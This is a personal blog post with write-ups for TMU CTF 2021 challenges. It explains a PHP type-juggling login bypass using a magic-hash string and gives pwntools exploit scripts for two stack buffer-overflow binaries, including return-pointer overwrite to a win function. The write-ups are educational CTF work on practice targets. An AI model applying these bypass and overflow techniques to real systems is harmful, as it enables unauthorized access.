---
title: "TMU CTF: Writeups"
categories: ["Hacking", "CTF", "Binary Exploitation", "Web Hacking"]
tags: ["hacking", "CTF", "Binary Exploitation", "Web Hacking", "Steganography"]
date: "2021-09-11"
type: "post"
weight: 400
keywords: "hacking pentesting c source code auditing static analysis"
toc: "true"
---

This was a well rounded CTF in my opinion with good challenges for beginners (like me) that were not too trivial. Instead of the standard `robots.txt` or source code inspection they had challenges where one could easily find clues to get started researching the challenges. That is even if the solution wasn't immediately clear you had at least some direction for a google search and a shot at solving the challenge during the CTF runtime.

I didn't get a chance to spend too long playing the CTF and had a few near misses but here are a few challenge writeups.

## Web

### Login

Straight away we hit up `/robots.txt` as is my approach for every ctf web challenge. This yields some PHP sauce:


```php
if (isset($_GET["password"])) {
    if (hash("md5", $_GET["password"]) == $_GET["password"]) {
        echo "<h1>Here is the flag:</h1>" . $flag;
    } else {
        echo "Try harder!";
    }
}
```

Which I look at and have two guesses:

+ md5 collisions
+ type juggling

Now its important to note that 'type juggling' is a term I have *heard* of in relation to PHP vulnerabilities. But which I knew nothing about really. 

Now we focus on the only important line here:

`if (hash("md5", $_GET["password"]) == $_GET["password"])` 


The first guess is based on the idea that `md5` is a known vulnerable hashing algorithm which fails on several properties of a cryptographic hash:

+ Collision resistance
   + It should be hard to choose any two messages that result in the same hash
+ Preimage resistance
   + Given the hash, it should be hard to find the original message
+ Second Preimage Resistance 
   + Given the hash and the original message, it should be hard to come up with a second message that has the same hash


None of these quite fit the scenario we have here but remembering I don't know anything about type juggling I decide to investigate my first guess further (md5 could be that bad right?). After googling around for awhile I found a combination of "it might be possible" and a question [here](https://crypto.stackexchange.com/questions/19493/is-there-a-string-thats-hash-is-equal-to-itself) on the exact question at hand:

> Is it possible to have an md5 hash equal its input?

But since the answer was inconclusive and no example of such a string was provided I decided to learn about type juggeling.

First port of call is of course the amazing repo [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Which provided the perfect overview of PHP type juggling in the presence of the lose comparison `==` operator. I then setup a PHP repel with the function using [writephponline](https://www.writephponline.com/).

![](https://i.imgur.com/z5zTCOU.png)

We can then start testing out how PHP handles certain inputs. At first I tried some simple things like int `0` (`$password = 0`) which obviously worked but would not work against the remote host since upon a quick confirmation search the `$_GET["password"]` in the original source will return a string. 

Hence we look for a string comparison that evaluates to `0`. After a few tries and searching around I came up with [this](https://stackoverflow.com/questions/62293578/ctf-type-juggling-with-ripemd160-hash#62300133) stack post which explains and also drops a working string `0e215962017` which PHP will treat as a float leading to a zero eval.

![](https://i.imgur.com/6vZWSDr.png)

This works against the server implementation too and we collect the flag.

> TMUCTF{D0_y0u_kn0w_7h3_d1ff3r3nc3_b37w33n_L0053_c0mp4r150n_4nd_57r1c7_c0mp4r150n_1n_PHP!?}

## pwn

### Warmup 

This one was quite a straightforward BOF challenge if you know about even basic overflow challenges you would likely have just tried a long string against the input to test for offsets and fingerprint the binary. In this case a long enough input such as:

`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`

Will overwrite a value on the stack which is compared to `0` in a if condition somewhere causing the check to pass and the flag to be printed.

It's easiest just to do this overflow with netcat but here's a script anyway.

```python
from pwn import *

HOST = '194.5.207.56'
PORT = '7000'
proc = remote(HOST, PORT)
proc.sendlineafter('Let us know your name: \n', b'A' * 242)
log.success(proc.recvall())
```

> TMUCTF{n0w_y0u_4r3_w4rm3d_up}

### Baby Pwn

We start out by checking the memory protections and gather other info about the binary which may indicate how it is exploitable. I like to run a simple script I made called [binaliser](https://github.com/Angus-C-git/binaliser) which makes guesses based on memory protections enabled and other metrics about the strategy for the binary. 

![](https://i.imgur.com/emmZ0NX.png)

In this case we have the following memory protections:


```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

with the **NX** bit set and no win function detected, this indicates either a ROP challenge or a win function with a name not detected by the script. We can get more of an idea about the potential for rop by checking what gadgets are present in the binary.

After running the binary and ropper I note that the gadgets are pretty sparse with only `124` detected and not many of those useful.

Thus its time for the next trick in the book, static analysis. My disassembler of choice is [binary ninja](https://binary.ninja/) since I could pick it up for 'cheap' as a student. Looking at the disassembled binary gives us this main function:


{{< image ref="images/blog/ctfs/mainBabyPwn.png" >}}


But also a strange function named **wow**, which has the following disassembly:


{{< image ref="images/blog/ctfs/wowBabyPwn.png" >}}

This is our **win** function since it opens the flag file to read and prints it to stdout. So now we have a plan of attack:

1. Control the return pointer 
2. Return to the 'wow' function

Now when we run the binary we get the following output:

{{< image ref="images/blog/ctfs/outBabyPwn.png" >}}

If we attempt a trivial overflow we will fail the compare in the main function disassembly:

```nasm
cmp     dword [rbp-0x4], 0xcafe
```

and fail to reach the vulnerable code in `helloUser` that will let us control the return pointer. We beat this custom canary by calculating the offset to it and then inserting the expected value as follows:

```python
log.info(f"offset to cmp @: {cyclic_find('iaa') - 4}")
# pass inital cmp
canary = flat({
    32 - 4: p64(0xcafe)
})
```

This takes us to the vulnerable function and the next stage of our exploit: controlling the return pointer and returning to **wow**, our win function. This is just a simple overflow which we can simplify with pwntools `flat` and `symbols` functions once again to complete the exploit chain.

**Exploit**

```python 
log.info(f"offset to cmp @: {cyclic_find('iaa') - 4}")
# pass inital cmp
canary = flat({
    32 - 4: p64(0xcafe)
})
proc.sendlineafter('enter your name:', canary)

## win @wow    
payload = flat({
    136: elf.symbols['wow']
})

proc.sendlineafter('yourself ;;)\n', payload)

# shellit
proc.interactive()
```

> TMUCTF{w0w!_y0u_c0uld_f1nd_7h3_w0w!}
